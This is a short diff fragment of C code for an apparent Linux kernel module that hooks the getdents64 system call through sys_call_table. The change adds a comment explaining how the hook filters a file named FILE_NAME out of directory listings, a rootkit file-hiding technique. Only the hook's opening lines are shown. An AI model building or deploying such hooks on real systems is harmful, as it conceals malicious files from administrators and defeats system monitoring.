@@ -13,7 +13,15 @@ void **sys_call_table;
 
 asmlinkage int (*getdents64_original) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 
-asmlinkage int getdents64_hook        (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
+asmlinkage int   getdents64_hook      (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
+/*
+run the actual system call,
+loop through the struct returned,
+searching each filename (linux_dirent64->d_name)
+with the static constant FILE_NAME,
+if it matches recalculating
+what is being returned
+*/
   int rtn;
   struct linux_dirent64 *cur = dirp;
   int i = 0;
